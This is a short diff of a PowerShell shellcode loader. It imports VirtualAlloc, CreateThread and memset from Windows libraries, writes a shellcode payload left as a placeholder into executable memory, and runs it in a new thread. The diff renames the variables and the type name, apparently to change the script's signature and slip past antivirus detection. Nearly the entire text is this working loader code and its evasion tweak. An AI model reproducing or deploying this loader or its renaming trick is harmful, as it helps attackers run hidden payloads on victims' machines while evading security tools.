@@ -63,14 +63,14 @@ public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStack
 IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
 [DllImport("msvcrt.dll")]
 public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
-$winFunc = 
- Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
+$var2 = Add-Type -memberDefinition $code -Name "iWin32" -namespace Win32Functions -
+passthru;
 [Byte[]];
-[Byte[]]$sc = <place your shellcode here>;
+[Byte[]]$var1 = <place your shellcode here>;
 $size = 0x1000;
-if ($sc.Length -gt 0x1000) {$size = $sc.Length};
-$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);
-for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), 
-$sc[$i], 1)};
-$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
+if ($var1.Length -gt 0x1000) {$size = $var1.Length};
+$x = $var2::VirtualAlloc(0,$size,0x3000,0x40);
+for ($i=0;$i -le ($var1.Length-1);$i++) {$var2::memset([IntPtr]($x.ToInt32()+$i), 
+$var1[$i], 1)};
+$var2::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
 ```
